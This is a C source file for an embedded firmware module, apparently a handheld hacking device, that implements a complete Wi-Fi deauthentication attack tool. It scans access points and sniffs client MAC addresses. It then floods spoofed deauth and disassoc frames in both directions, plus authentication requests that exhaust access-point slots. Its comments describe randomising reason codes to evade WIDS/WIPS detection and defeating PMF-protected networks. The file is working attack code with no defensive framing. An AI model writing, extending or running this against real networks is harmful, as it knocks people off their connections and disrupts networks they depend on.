/*
 * wifi_deauth.c - Deauther sub-application.
 *
 * Flow:
 *   SCAN        - async AP scan (shows spinner)
 *   AP_SELECT   - scrollable checklist of discovered APs
 *   SNIFF       - passive sniff; iterates unique channels of selected APs
 *                 (10 s per channel) to discover clients; BACK skips ahead
 *   CLIENT_SEL  - scrollable checklist of sniffed clients + "Broadcast"
 *   ATTACK      - deauth loop; bottom of screen shows activity log
 *   DONE        - summary; SELECT restarts from SCAN, BACK exits
 *
 * Deauth frame layout (management, ToDS=0 FromDS=0):
 *   Addr1 = RA/DA  (frame recipient)
 *   Addr2 = TA/SA  (frame transmitter, spoofed)
 *   Addr3 = BSSID
 *
 * Two directions are sent per client per burst:
 *   AP→STA:  Addr1=client  Addr2=AP_bssid  Addr3=AP_bssid
 *   STA→AP:  Addr1=AP_bssid  Addr2=client  Addr3=AP_bssid
 *
 * Reason codes are randomised from the set {1,4,5,7,8,17} — all seen in
 * legitimate traffic (unspecified, inactivity, AP capacity, class3 frame,
 * leaving BSS, 802.1X failure) to look plausible to WIDS/WIPS.
 *
 * Client discovery:
 *   - DATA frames (type=2): Addr2 = transmitting STA
 *   - MGMT probe requests (type=0, sub=4): Addr2 = probing STA
 *   Both are captured to maximise discovery on the target channel.
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI

#include "wifi_deauth.h"
#include "wifi_common.h"
#include "bs/bs_gfx.h"
#include "bs/bs_nav.h"
#include "bs/bs_theme.h"
#include "bs/bs_ui.h"
#include "bs/bs_arch.h"
#include "bs/bs_wifi.h"

#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/* ── Config ─────────────────────────────────────────────────────────────── */

#define SNIFF_TIME_MS        10000   /* 10 s client discovery per channel */
#define ATTACK_BURST           1     /* deauth+disassoc frames per target per tick
                                      * Keep small: TX queue is 32 deep, radio
                                      * can drain ~3000 fps — burst>1 floods it  */
#define AUTH_FLOOD_BURST       4     /* auth-req floods per AP per tick           */

/* Reason codes: all observed in real networks, chosen to appear legitimate  */
static const uint16_t k_reasons[] = {1, 4, 5, 7, 8, 17};
#define N_REASONS 6

/* ── Activity log ────────────────────────────────────────────────────────── */

#define LOG_LINES    6
#define LOG_LINE_LEN 48

static char    s_log[LOG_LINES][LOG_LINE_LEN];
static int     s_log_head;
static int     s_log_count;

static void da_log(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(s_log[s_log_head], LOG_LINE_LEN, fmt, ap);
    va_end(ap);
    s_log[s_log_head][LOG_LINE_LEN - 1] = '\0';
    s_log_head  = (s_log_head + 1) % LOG_LINES;
    if (s_log_count < LOG_LINES) s_log_count++;
}

/* ── State ───────────────────────────────────────────────────────────────── */

typedef enum {
    DA_SCAN, DA_AP_SELECT, DA_SNIFF, DA_CLIENT_SEL, DA_ATTACK, DA_DONE
} da_state_t;

static da_state_t       s_state;
static int              s_cursor;
static bool             s_dirty;
static uint32_t         s_last_draw_ms;  /* rate-limit display refreshes     */

#define ATTACK_DRAW_INTERVAL_MS  2000  /* redraw attack screen every 2 s    */
#define SCAN_DRAW_INTERVAL_MS     100  /* spinner update every 100 ms        */
#define SNIFF_DRAW_INTERVAL_MS    500  /* sniff countdown update every 500 ms */

static wifi_ap_entry_t  s_aps[WIFI_MAX_APS];
static int              s_ap_count;
static int              s_ap_scroll;

static wifi_client_entry_t s_clients[WIFI_MAX_CLIENTS];
static int                 s_client_count;
static bool                s_broadcast_sel;
static int                 s_client_scroll;

/* Sniff: unique channel list from selected APs */
static uint8_t          s_sniff_channels[WIFI_MAX_APS];
static int              s_sniff_ch_count;
static int              s_sniff_ch_idx;
static uint32_t         s_sniff_start_ms;  /* 0 = not yet started this slot */

/* Attack state */
static wifi_pps_t       s_pps;
static wifi_prng_t      s_prng;
static uint8_t          s_frame[AUTH_FRAME_LEN];   /* largest frame we build */
static uint16_t         s_seq;                     /* rolling 802.11 seq counter */
static uint8_t          s_attack_ch;               /* last channel set; 0 = unset */
static const uint8_t    k_broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* ── Reason code randomizer ──────────────────────────────────────────────── */

static uint16_t random_reason(void) {
    return k_reasons[wifi_prng_next(&s_prng) % N_REASONS];
}

/* ── Client MAC dedup ────────────────────────────────────────────────────── */

static bool client_known(const uint8_t mac[6]) {
    for (int i = 0; i < s_client_count; i++)
        if (memcmp(s_clients[i].mac, mac, 6) == 0) return true;
    return false;
}

static void client_add(const uint8_t mac[6]) {
    if (s_client_count >= WIFI_MAX_CLIENTS) return;
    if (client_known(mac)) return;
    memcpy(s_clients[s_client_count].mac, mac, 6);
    s_clients[s_client_count].selected = false;
    s_client_count++;
}

/* ── Promiscuous frame callback (runs in WiFi task) ─────────────────────── */

static void sniff_cb(const uint8_t* frame, uint16_t len,
                     int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 24) return;
    uint8_t fc_type = frame[0] & 0x0C;
    uint8_t fc_sub  = (frame[0] >> 4) & 0x0F;
    /*
     * Capture client MACs from:
     *   DATA frames (type=2, fc_type=0x08): Addr2 = transmitting STA
     *   MGMT probe requests (type=0, sub=4): Addr2 = probing STA
     * Both have the client MAC at Addr2 (bytes 10-15).
     */
    if (fc_type == 0x08 || (fc_type == 0x00 && fc_sub == 4)) {
        client_add(frame + 10);
    }
}

/* ── Sniff channel helpers ───────────────────────────────────────────────── */

static void build_sniff_channels(void) {
    s_sniff_ch_count = 0;
    for (int i = 0; i < s_ap_count; i++) {
        if (!s_aps[i].selected) continue;
        uint8_t ch = s_aps[i].ap.channel;
        bool dup = false;
        for (int j = 0; j < s_sniff_ch_count; j++)
            if (s_sniff_channels[j] == ch) { dup = true; break; }
        if (!dup && s_sniff_ch_count < WIFI_MAX_APS)
            s_sniff_channels[s_sniff_ch_count++] = ch;
    }
}

/*
 * Start monitoring on the current sniff channel.
 * s_sniff_start_ms = 0 (sentinel); set from loop's 'now' on first DA_SNIFF
 * tick to avoid uint32 underflow when input processing runs after 'now'.
 */
static void sniff_start_channel(void) {
    uint8_t ch = s_sniff_channels[s_sniff_ch_idx];
    bs_wifi_monitor_start(ch, sniff_cb, NULL);
    s_sniff_start_ms = 0;
    da_log("Sniff ch.%d  (%d/%d)", ch, s_sniff_ch_idx + 1, s_sniff_ch_count);
}

static int selected_ap_count(void) {
    int n = 0;
    for (int i = 0; i < s_ap_count; i++) if (s_aps[i].selected) n++;
    return n;
}

/* ── List draw helpers ───────────────────────────────────────────────────── */

static int visible_rows(int ts) {
    int lh = bs_gfx_text_h(ts) + 3;
    return bs_ui_content_h() / lh;
}

static void draw_ap_list(void) {
    int ts  = bs_ui_text_scale();
    int sw  = bs_gfx_width();
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + 3;
    int vis = visible_rows(ts);

    bs_gfx_clear(g_bs_theme.bg);

    char title[32];
    int sel_count = 0;
    for (int i = 0; i < s_ap_count; i++) if (s_aps[i].selected) sel_count++;
    snprintf(title, sizeof title, "Select APs  [%d/%d]", sel_count, s_ap_count);
    bs_ui_draw_header(title);

    if (s_ap_count == 0) {
        bs_gfx_text(8, cy, "No APs found", g_bs_theme.dim, ts);
    } else {
        for (int i = 0; i < vis; i++) {
            int idx = s_ap_scroll + i;
            if (idx >= s_ap_count) break;
            bool hl = (idx == s_cursor);
            int  y  = cy + i * lh;
            if (hl) bs_gfx_fill_rect(0, y - 1, sw, lh - 1, g_bs_theme.dim);
            char buf[48];
            snprintf(buf, sizeof buf, "[%c] %-16.16s ch%-2d %4d",
                     s_aps[idx].selected ? 'X' : ' ',
                     s_aps[idx].ap.ssid[0] ? s_aps[idx].ap.ssid : "<hidden>",
                     s_aps[idx].ap.channel,
                     s_aps[idx].ap.rssi);
            bs_color_t col = hl ? g_bs_theme.accent : g_bs_theme.primary;
            bs_gfx_text(4, y, buf, col, ts);
        }
    }

    bs_ui_draw_hint("SELECT=toggle  RIGHT=next  BACK=exit");
    bs_gfx_present();
}

static void draw_client_list(void) {
    int ts  = bs_ui_text_scale();
    int sw  = bs_gfx_width();
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts) + 3;
    int vis = visible_rows(ts);

    bs_gfx_clear(g_bs_theme.bg);

    int total     = s_client_count + 1;
    int sel_count = s_broadcast_sel ? 1 : 0;
    for (int i = 0; i < s_client_count; i++) if (s_clients[i].selected) sel_count++;
    char title[32];
    snprintf(title, sizeof title, "Select Clients [%d/%d]", sel_count, total);
    bs_ui_draw_header(title);

    for (int i = 0; i < vis; i++) {
        int idx = s_client_scroll + i;
        if (idx >= total) break;
        bool hl = (idx == s_cursor);
        int  y  = cy + i * lh;
        if (hl) bs_gfx_fill_rect(0, y - 1, sw, lh - 1, g_bs_theme.dim);

        char buf[48];
        bool selected;
        if (idx == 0) {
            selected = s_broadcast_sel;
            snprintf(buf, sizeof buf, "[%c] BROADCAST (FF:FF:FF:FF:FF:FF)",
                     selected ? 'X' : ' ');
        } else {
            int ci = idx - 1;
            selected = s_clients[ci].selected;
            char mac[18];
            bs_wifi_bssid_str(s_clients[ci].mac, mac);
            snprintf(buf, sizeof buf, "[%c] %s", selected ? 'X' : ' ', mac);
        }
        bs_color_t col = hl ? g_bs_theme.accent : g_bs_theme.primary;
        bs_gfx_text(4, y, buf, col, ts);
    }

    bs_ui_draw_hint("SELECT=toggle  RIGHT=attack  BACK=back");
    bs_gfx_present();
}

static void draw_scan(void) {
    int ts = bs_ui_text_scale();
    int cy = bs_ui_content_y();
    static uint8_t spin;
    const char* spinners = "-\\|/";
    char buf[32];
    snprintf(buf, sizeof buf, "Scanning...  %c", spinners[spin++ & 3]);

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Deauther");
    bs_gfx_text(8, cy, buf, g_bs_theme.primary, ts);
    bs_ui_draw_hint("BACK=cancel");
    bs_gfx_present();
}

static void draw_sniff(uint32_t now_ms) {
    int ts = bs_ui_text_scale();
    int cy = bs_ui_content_y();
    int lh = bs_gfx_text_h(ts) + 4;

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Sniffing Clients");

    char buf[48];
    snprintf(buf, sizeof buf, "Channel: %d  (%d / %d)",
             (s_sniff_ch_count > 0) ? (int)s_sniff_channels[s_sniff_ch_idx] : 0,
             s_sniff_ch_idx + 1, s_sniff_ch_count);
    bs_gfx_text(8, cy, buf, g_bs_theme.primary, ts);

    snprintf(buf, sizeof buf, "Clients: %d", s_client_count);
    bs_gfx_text(8, cy + lh, buf, g_bs_theme.accent, ts);

    uint32_t elapsed = (s_sniff_start_ms > 0) ? (now_ms - s_sniff_start_ms) : 0;
    uint32_t remain  = (elapsed < SNIFF_TIME_MS)
                       ? (SNIFF_TIME_MS - elapsed) / 1000 : 0;
    snprintf(buf, sizeof buf, "Time left: %lu s", (unsigned long)remain);
    bs_gfx_text(8, cy + 2*lh, buf, g_bs_theme.secondary, ts);

    bs_ui_draw_hint("BACK=skip");
    bs_gfx_present();
}

static void draw_attack(void) {
    int ts  = bs_ui_text_scale();
    int ts2 = ts > 1 ? ts - 1 : 1;
    int cy  = bs_ui_content_y();
    int lh  = bs_gfx_text_h(ts)  + 4;
    int lh2 = bs_gfx_text_h(ts2) + 3;
    char buf[LOG_LINE_LEN];

    bs_gfx_clear(g_bs_theme.bg);
    bs_ui_draw_header("Deauth [RUNNING]");

    snprintf(buf, sizeof buf, "Frames: %lu", (unsigned long)s_pps.total);
    bs_gfx_text(8, cy,       buf, g_bs_theme.accent, ts);
    snprintf(buf, sizeof buf, "PPS:    %lu", (unsigned long)s_pps.pps);
    bs_gfx_text(8, cy + lh,  buf, g_bs_theme.accent, ts);

    /* ── Activity log ── */
    int sep_y = cy + 2 * lh + 4;
    bs_gfx_fill_rect(0, sep_y, bs_gfx_width(), 1, g_bs_theme.dim);
    int log_y = sep_y + 4;

    for (int i = 0; i < s_log_count; i++) {
        /* Oldest first: walk from (head - count) forward */
        int li = ((s_log_head - s_log_count + i) + LOG_LINES) % LOG_LINES;
        bs_color_t col = (i == s_log_count - 1) ? g_bs_theme.primary : g_bs_theme.dim;
        bs_gfx_text(8, log_y + i * lh2, s_log[li], col, ts2);
    }

    bs_ui_draw_hint("BACK=stop");
    bs_gfx_present();
}

/* ── Attack: send deauth to all selected targets ─────────────────────────── */

/*
 * 802.11 seq-ctrl (LE) at bytes 22-23: bits[0-3]=frag, bits[4-15]=seq.
 * Many APs drop frames with a repeated seq=0; increment per-frame.
 */
static inline void apply_seq(uint8_t* frame) {
    frame[22] = (uint8_t)((s_seq & 0x0F) << 4);
    frame[23] = (uint8_t)(s_seq >> 4);
    s_seq++;
}

/* Send deauth + disassoc in both directions; subtypes handled by different
 * driver code paths on some clients, improving coverage on non-PMF networks. */
static void send_kick(const uint8_t* dst, const uint8_t* src,
                      const uint8_t* bssid, uint32_t now_ms) {
    uint16_t r = random_reason();
    wifi_build_deauth(s_frame, dst, src, bssid, r);
    apply_seq(s_frame);
    if (bs_wifi_send_raw(BS_WIFI_IF_AP, s_frame, DEAUTH_FRAME_LEN) == 0)
        wifi_pps_tick(&s_pps, now_ms);
    wifi_build_disassoc(s_frame, dst, src, bssid, r);
    apply_seq(s_frame);
    if (bs_wifi_send_raw(BS_WIFI_IF_AP, s_frame, DEAUTH_FRAME_LEN) == 0)
        wifi_pps_tick(&s_pps, now_ms);
}

static void attack_tick(const bs_arch_t* arch) {
    uint32_t now = arch->millis();

    for (int ai = 0; ai < s_ap_count; ai++) {
        if (!s_aps[ai].selected) continue;
        const uint8_t* bssid = s_aps[ai].ap.bssid;

        /* Only switch channel when it changes — esp_wifi_set_channel() costs
         * several ms and calling it every tick throttles injection to ~42 PPS. */
        if (s_aps[ai].ap.channel != s_attack_ch) {
            s_attack_ch = s_aps[ai].ap.channel;
            bs_wifi_set_channel(s_attack_ch);
        }

        /* ── Deauth + disassoc ───────────────────────────────────────────── */
        if (s_broadcast_sel) {
            for (int b = 0; b < ATTACK_BURST; b++)
                send_kick(k_broadcast, bssid, bssid, now);
        }

        for (int ci = 0; ci < s_client_count; ci++) {
            if (!s_clients[ci].selected) continue;
            for (int b = 0; b < ATTACK_BURST; b++) {
                send_kick(s_clients[ci].mac, bssid, bssid, now); /* AP→STA */
                send_kick(bssid, s_clients[ci].mac, bssid, now); /* STA→AP */
            }
        }

        /* Auth-flood: each request consumes an AP AID slot; once full (32–2048
         * entries), real clients are rejected.  Works against PMF: pre-auth
         * frames have no MIC protection.                                     */
        for (int b = 0; b < AUTH_FLOOD_BURST; b++) {
            uint8_t fake_mac[6];
            wifi_random_mac(&s_prng, fake_mac);
            wifi_build_auth_req(s_frame, bssid, fake_mac);
            apply_seq(s_frame);
            if (bs_wifi_send_raw(BS_WIFI_IF_AP, s_frame, AUTH_FRAME_LEN) == 0)
                wifi_pps_tick(&s_pps, now);
        }
    }
}

/* ── Public entry point ──────────────────────────────────────────────────── */

void wifi_deauth_run(const bs_arch_t* arch) {
    bs_wifi_set_tx_power(20);
    wifi_prng_seed(&s_prng, arch->millis() ^ 0xDEA7CAFEu);

    s_state         = DA_SCAN;
    s_cursor        = 0;
    s_dirty         = true;
    s_ap_count      = 0;
    s_ap_scroll     = 0;
    s_client_count  = 0;
    s_client_scroll = 0;
    s_broadcast_sel = false;
    s_sniff_ch_count = 0;
    s_sniff_ch_idx   = 0;
    s_sniff_start_ms = 0;
    s_log_head     = 0;
    s_log_count    = 0;
    s_last_draw_ms = 0;

    da_log("Scanning for APs...");
    bs_wifi_scan_start();

    for (;;) {
        uint32_t now = arch->millis();

        /* ── Input ── */
        bs_nav_id_t nav;
        while ((nav = bs_nav_poll()) != BS_NAV_NONE) {
            switch (s_state) {
                case DA_SCAN:
                    if (nav == BS_NAV_BACK) return;
                    break;

                case DA_AP_SELECT: {
                    int total = s_ap_count;
                    int vis   = visible_rows(bs_ui_text_scale());
                    switch (nav) {
                        case BS_NAV_UP:   case BS_NAV_PREV:
                            if (s_cursor > 0) {
                                s_cursor--;
                                if (s_cursor < s_ap_scroll) s_ap_scroll = s_cursor;
                            }
                            s_dirty = true; break;
                        case BS_NAV_DOWN: case BS_NAV_NEXT:
                            if (s_cursor < total - 1) {
                                s_cursor++;
                                if (s_cursor >= s_ap_scroll + vis)
                                    s_ap_scroll = s_cursor - vis + 1;
                            }
                            s_dirty = true; break;
                        case BS_NAV_SELECT:
                            if (s_cursor < total) {
                                s_aps[s_cursor].selected = !s_aps[s_cursor].selected;
                                s_dirty = true;
                            }
                            break;
                        case BS_NAV_RIGHT:
                            if (selected_ap_count() > 0) {
                                s_client_count = 0;
                                build_sniff_channels();
                                s_sniff_ch_idx = 0;
                                sniff_start_channel();
                                s_state = DA_SNIFF;
                                s_dirty = true;
                            }
                            break;
                        case BS_NAV_BACK:
                            return;
                        default: break;
                    }
                    break;
                }

                case DA_SNIFF:
                    if (nav == BS_NAV_BACK) {
                        bs_wifi_monitor_stop();
                        da_log("Sniff skipped, %d clients", s_client_count);
                        s_cursor        = 0;
                        s_client_scroll = 0;
                        s_state = DA_CLIENT_SEL;
                        s_dirty = true;
                    }
                    break;

                case DA_CLIENT_SEL: {
                    int total = s_client_count + 1;
                    int vis   = visible_rows(bs_ui_text_scale());
                    switch (nav) {
                        case BS_NAV_UP:   case BS_NAV_PREV:
                            if (s_cursor > 0) {
                                s_cursor--;
                                if (s_cursor < s_client_scroll)
                                    s_client_scroll = s_cursor;
                            }
                            s_dirty = true; break;
                        case BS_NAV_DOWN: case BS_NAV_NEXT:
                            if (s_cursor < total - 1) {
                                s_cursor++;
                                if (s_cursor >= s_client_scroll + vis)
                                    s_client_scroll = s_cursor - vis + 1;
                            }
                            s_dirty = true; break;
                        case BS_NAV_SELECT:
                            if (s_cursor == 0) {
                                s_broadcast_sel = !s_broadcast_sel;
                            } else {
                                int ci = s_cursor - 1;
                                if (ci < s_client_count)
                                    s_clients[ci].selected = !s_clients[ci].selected;
                            }
                            s_dirty = true; break;
                        case BS_NAV_RIGHT: {
                            bool any = s_broadcast_sel;
                            if (!any) for (int i = 0; i < s_client_count; i++)
                                if (s_clients[i].selected) { any = true; break; }
                            if (any) {
                                wifi_pps_init(&s_pps);
                                s_seq = (uint16_t)(arch->millis() & 0xFFF);
                                int tgt = s_broadcast_sel ? 1 : 0;
                                for (int i = 0; i < s_client_count; i++)
                                    if (s_clients[i].selected) tgt++;
                                da_log("Attack: %d target(s)", tgt);
                                for (int i = 0; i < s_ap_count; i++) {
                                    if (!s_aps[i].selected) continue;
                                    da_log("  AP ch%d %.12s",
                                           s_aps[i].ap.channel,
                                           s_aps[i].ap.ssid[0] ?
                                               s_aps[i].ap.ssid : "<hidden>");
                                }
                                if (s_broadcast_sel)
                                    da_log("  -> BROADCAST");
                                for (int i = 0; i < s_client_count; i++) {
                                    if (!s_clients[i].selected) continue;
                                    char mac[18];
                                    bs_wifi_bssid_str(s_clients[i].mac, mac);
                                    da_log("  -> %s", mac);
                                }
                                s_attack_ch = 0;   /* 0 = unset; forces channel on first tick */
                                s_state = DA_ATTACK;
                                s_dirty = true;
                            }
                            break;
                        }
                        case BS_NAV_BACK:
                            s_cursor    = 0;
                            s_ap_scroll = 0;
                            s_state = DA_AP_SELECT;
                            s_dirty = true;
                            break;
                        default: break;
                    }
                    break;
                }

                case DA_ATTACK:
                    if (nav == BS_NAV_BACK) {
                        da_log("Attack stopped: %lu frames",
                               (unsigned long)s_pps.total);
                        s_state = DA_DONE;
                        s_dirty = true;
                    }
                    break;

                case DA_DONE:
                    if (nav == BS_NAV_SELECT) {
                        s_ap_count     = 0;
                        s_client_count = 0;
                        s_cursor       = 0;
                        s_ap_scroll    = 0;
                        s_log_head  = 0;
                        s_log_count = 0;
                        da_log("Scanning for APs...");
                        bs_wifi_scan_start();
                        s_state = DA_SCAN;
                        s_dirty = true;
                    } else if (nav == BS_NAV_BACK) {
                        return;
                    }
                    break;
            }
        }

        /* ── Tick ── */
        switch (s_state) {
            case DA_SCAN:
                if (bs_wifi_scan_done()) {
                    bs_wifi_ap_t tmp[WIFI_MAX_APS];
                    s_ap_count = bs_wifi_scan_results(tmp, WIFI_MAX_APS);
                    for (int i = 0; i < s_ap_count; i++) {
                        s_aps[i].ap       = tmp[i];
                        s_aps[i].selected = false;
                    }
                    da_log("Found %d APs", s_ap_count);
                    s_cursor = 0;
                    s_state  = DA_AP_SELECT;
                    s_dirty  = true;  /* state transition: draw immediately */
                } else if ((now - s_last_draw_ms) >= SCAN_DRAW_INTERVAL_MS) {
                    s_last_draw_ms = now;
                    s_dirty = true;   /* spinner tick */
                }
                break;

            case DA_SNIFF: {
                if (s_sniff_start_ms == 0) s_sniff_start_ms = now;
                uint32_t elapsed = now - s_sniff_start_ms;
                if (elapsed >= SNIFF_TIME_MS) {
                    bs_wifi_monitor_stop();
                    da_log("ch.%d done: %d client(s)",
                           (int)s_sniff_channels[s_sniff_ch_idx], s_client_count);
                    s_sniff_ch_idx++;
                    if (s_sniff_ch_idx < s_sniff_ch_count) {
                        sniff_start_channel();
                    } else {
                        da_log("Sniff complete: %d client(s)", s_client_count);
                        s_cursor        = 0;
                        s_client_scroll = 0;
                        s_state = DA_CLIENT_SEL;
                    }
                    s_last_draw_ms = now;
                    s_dirty = true;   /* state/channel transition: draw immediately */
                } else if ((now - s_last_draw_ms) >= SNIFF_DRAW_INTERVAL_MS) {
                    s_last_draw_ms = now;
                    s_dirty = true;   /* countdown update */
                }
                break;
            }

            case DA_ATTACK:
                attack_tick(arch);
                if ((now - s_last_draw_ms) >= ATTACK_DRAW_INTERVAL_MS) {
                    s_last_draw_ms = now;
                    s_dirty = true;
                }
                break;

            default: break;
        }

        /* ── Draw ── */
        if (s_dirty) {
            s_dirty = false;
            switch (s_state) {
                case DA_SCAN:       draw_scan();          break;
                case DA_AP_SELECT:  draw_ap_list();       break;
                case DA_SNIFF:      draw_sniff(now);      break;
                case DA_CLIENT_SEL: draw_client_list();   break;
                case DA_ATTACK:     draw_attack();        break;
                case DA_DONE: {
                    int ts = bs_ui_text_scale();
                    int cy = bs_ui_content_y();
                    int lh = bs_gfx_text_h(ts) + 4;
                    char buf[32];
                    bs_gfx_clear(g_bs_theme.bg);
                    bs_ui_draw_header("Deauth Done");
                    snprintf(buf, sizeof buf, "Total frames: %lu",
                             (unsigned long)s_pps.total);
                    bs_gfx_text(8, cy, buf, g_bs_theme.accent, ts);
                    bs_gfx_text(8, cy + lh, "SELECT=restart  BACK=exit",
                                g_bs_theme.dim, ts);
                    bs_gfx_present();
                    break;
                }
            }
        }

        arch->delay_ms(1);
    }
}

#endif /* BS_HAS_WIFI */
